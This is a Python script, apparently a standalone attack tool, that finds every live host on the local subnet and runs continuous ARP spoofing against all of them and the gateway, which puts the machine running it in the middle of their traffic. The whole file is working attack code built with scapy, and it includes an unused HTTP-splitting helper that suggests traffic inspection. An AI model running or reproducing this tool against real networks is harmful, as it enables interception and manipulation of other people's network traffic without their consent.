import scapy.all as scapy
from subprocess import check_output
import threading
import aioping
import socket
import asyncio
from time import sleep
import sys
from re import findall
import signal

scapy.conf.verb = 0
thread_stop = False
all_ip = []
spoof_list = {}


def shutdown(*args):
    global thread_stop
    thread_stop = True
    print("\n[!] Goodbye")
    sys.exit(0)


async def aping(host, timeout=10):
    global thread_stop
    if thread_stop:
        return
    try:
        await aioping.ping(host, timeout=timeout)
        return host
    except KeyboardInterrupt:
        thread_stop = True
    except:
        return

def get_mac_by_ip(ip: str):
    global thread_stop
    if thread_stop:
        return
    try:
        arp = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        request = broadcast / arp
        res = scapy.srp(request, verbose=False, timeout=5)[0][0]
        return res.answer.hwsrc
    except KeyboardInterrupt:
        thread_stop = True
    except:
        return False

def get_mac(ip: str):
    cmd = check_output(f"arp -a {ip}").decode(errors="ignore")
    mac = None
    try:
        mac = findall(r"(([0-9a-f]{2}\-?){6})", cmd)[0][0].replace("-", ":")
    except:
        pass
        
    return mac


def spoof():
    global thread_stop, spoof_list
    try:
        while not thread_stop:
            sl = spoof_list.copy()
            for target_ip in sl:
                target_mac = spoof_list[target_ip]
                spoof_mac = spoof_list["gateway"]
                spoof_ip = ".".join(target_ip.split(".")[:-1])+".1"
                packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
                packet_to_router = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
                if target_ip in all_ip:
                    print(f"Spoof {target_ip}")
                    scapy.send(packet_to_target, verbose=False)
                    scapy.send(packet_to_router, verbose=False)
            sleep(1)
    except KeyboardInterrupt:
        thread_stop = True

def http_split(payload: bytes):
    headers = None
    body = None
    if payload.find(b"\r\n\r\n") != -1:
        i = payload.find(b"\r\n\r\n")
        headers = payload[:i]
        body = payload[i+4:]
    return headers, body


async def main():
    global all_ip, thread_stop, spoof_list
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        mask = ".".join(ip.split(".")[:-1])
    all_ip = await asyncio.gather(*[aping(f"{mask}.{i}", 5) for i in range(2, 256)])
    all_ip = list(filter(None, all_ip))
    for idx, ip in enumerate(all_ip, 1):
        print(f"{idx}. {ip}")
    spoofer = threading.Thread(target=spoof, daemon=True)
    spoofer.start()
    spoof_list.update({"gateway": get_mac(f"{mask}.1")})
    while True:
        try:
            for ip in all_ip:
                mac = get_mac(ip)
                if not mac:
                    mac = get_mac_by_ip(ip)
                    if not mac:
                        continue
                spoof_list.update({ip: mac})
            all_ip = await asyncio.gather(*[aping(f"{mask}.{i}", 5) for i in range(2, 256)])
            all_ip = list(filter(None, all_ip))
        except KeyboardInterrupt:
            thread_stop = True
            spoofer.join(timeout=1)
            return
        except:
            return


if __name__ == "__main__":
    signal.signal(signal.SIGINT, shutdown)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        shutdown()
